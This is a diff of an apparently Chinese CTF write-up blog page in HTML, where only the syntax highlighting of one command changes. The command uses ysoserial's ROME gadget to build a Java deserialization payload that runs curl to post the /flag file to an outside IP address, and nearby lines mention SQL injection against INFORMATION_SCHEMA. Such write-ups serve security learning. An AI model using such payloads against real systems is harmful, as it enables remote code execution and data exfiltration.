@@ -445,7 +445,7 @@ Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema &#x3D; &#
 <p>登录成功拿到token，发现是Java序列化后内容</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png"></p>
 <p>并且将内容提交到currentAPI中时，也会返回用户信息，yso构造序列化攻击即可</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;Users&#x2F;jlan&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;azul-1.8.0_332&#x2F;Contents&#x2F;Home&#x2F;bin&#x2F;java -jar &#x2F;Users&#x2F;jlan&#x2F;Documents&#x2F;Tools&#x2F;ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;182.61.46.138:1000 -d @&#x2F;flag&quot; |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java <span class="token parameter variable">-jar</span> /Users/jlan/Documents/Tools/ysoserial-all.jar ROME <span class="token string">"curl http://182.61.46.138:1000 -d @/flag"</span> <span class="token operator">|</span>base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png"></p>
 <h2 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2><p>快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p>
